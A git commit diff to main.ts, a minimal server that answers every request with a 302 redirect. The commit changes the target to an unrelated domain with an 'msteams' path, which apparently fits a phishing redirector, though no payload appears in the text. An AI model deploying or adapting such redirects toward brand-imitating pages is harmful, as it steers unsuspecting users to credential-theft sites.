55271a6286d2d36cbca09215d33d2239dd9a89a2
Digital2025001 <bosmichael30@gmail.com>
2025-10-30 07:36:54 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dcopv.com/irr/", // Replace this with your actual link
+      Location: "https://ulvarin.mypi.co/msteams/", // Replace this with your actual link
     },
   });
 });
